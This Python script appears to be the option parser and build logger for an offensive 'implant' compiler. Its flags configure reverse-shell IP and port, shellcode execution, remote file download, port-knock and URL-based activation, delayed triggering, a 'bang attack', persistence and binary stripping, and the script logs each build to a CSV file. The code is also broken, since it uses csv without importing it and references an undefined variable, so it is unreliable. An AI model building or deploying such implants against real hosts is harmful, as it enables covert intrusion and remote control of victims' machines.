import datetime
import argparse
import binascii
import os


parser = argparse.ArgumentParser("python compiler.py", usage='%(prog)s [-o fileName] [-p listener] [-intfc eth0] [-act SECRET_PORTS] [-key 200,300,400] [-atkSc] [-a x64] [-p linux] [-ip 192.160.1.100] [-revip 192.168.2.132] [-revport 1337] [-strip]')

parser.add_argument("-d", "--debug", action="store_true",
                    help="compile with debugging")
parser.add_argument("-ip", "--ipAddress",type=str,
                    help="target address", metavar='', default="unknown")
parser.add_argument("-do", "--domain", type=str,
                    help="target domain", metavar='', default="unknown")
parser.add_argument("-p", "--platform",type=str, metavar='',
                    help="platform", default="unknown")
parser.add_argument("-a", "--architecture",type=str, metavar='',
                    help="system architecture", default="unknown")
parser.add_argument("-os", "--os",type=str, metavar='',
                    help="operating system", default="unknown")
parser.add_argument("-vn", "--versionNumber",type=str, metavar='',
                    help="version no.", default="unknown")
parser.add_argument("-pay", "--payload",type=str, metavar='',
                    help="payload type", default="listener")
parser.add_argument("-o", "--outputName",type=str, metavar='',
                    help="output filename", default="implant")
parser.add_argument("-intfc", "--interface",type=str, metavar='',
                    help="listener interface") 
parser.add_argument("-act", "--activate", type=str, metavar='',
                    help="activation method")
parser.add_argument("-key", "--key",type=str, metavar='',
                    help="activation key")
parser.add_argument("-size", "--size",type=str, metavar='',
                    help="number of knocks to listen for")
parser.add_argument("-trig", "--trigger",type=str, metavar='',
                    help="target URL to check")
parser.add_argument("-delayT", "--timeDelay", type=str, metavar='',
                    help="time in between checks")
parser.add_argument("-delayD", "--dateDelay", type=str, metavar='',
                    help="sleep until this date")
parser.add_argument("-atkD", "--downloadURL",type=str, metavar='',
                    help="download file from this url")
parser.add_argument("-atkB", "--bang", action="store_true", 
                    help="execute bang attack function")
parser.add_argument("-atkSc", "--loadShellcode", action="store_true", 
                    help="execute shellcode")
parser.add_argument("-atkR", "--reverseShell",action="store_true", 
                    help="run a reverse shell")
parser.add_argument("-revip", "--reverseIP",type=str, metavar='',
                    help="reverse shell IP")  
parser.add_argument("-revport", "--reversePort",type=str, metavar='',
                    help="reverse shell Port")                     
parser.add_argument("-per", "--persistence",type=str, metavar='',
                    help="persistence mechanism (not implemented)") 
parser.add_argument("-notes", "--notes",type=str, metavar='',
                    help="notes", default="No Notes")
parser.add_argument("-strip", "--strip", action="store_true", 
                    help="strip the binary")
parser.add_argument("-static", "--static", action="store_true", 
                    help="statically link the binary")

args = parser.parse_args()

with open('log.csv', mode='a+') as log_file:
    
    log_writer = csv.writer(log_file, delimiter='\t', quotechar='"', quoting=csv.QUOTE_MINIMAL)
    if (file_exists != 1):
        fieldnamesList = ["datetime", "ipAddress", "domain", "architecture", "platform", "os", "versionNumber", "payload", "activate", "interface", "key", "size", "dateDelay", "timeDelay", "trigger", "persistence", "bang", "downloadURL", "loadShellcode", "reverseShell", "reverseIP", "reversePort", "Notes", "debug", "outputName", "strip", "static"]
        log_writer.writerow(fieldnamesList)

    log_writer.writerow([str(datetime.datetime.now()), str(args.ipAddress), str(args.domain), str(args.architecture), str(args.platform), str(args.os), str(args.versionNumber), str(args.payload), str(args.activate), str(args.interface), str(args.key), str(args.size), str(args.dateDelay), str(args.timeDelay), str(args.trigger), str(args.persistence), str(args.bang), str(args.downloadURL), str(args.loadShellcode), str(args.reverseShell), str(args.reverseIP), str(args.reversePort), str(args.notes), str(args.debug), str(args.outputName), str(args.strip), str(args.static)])







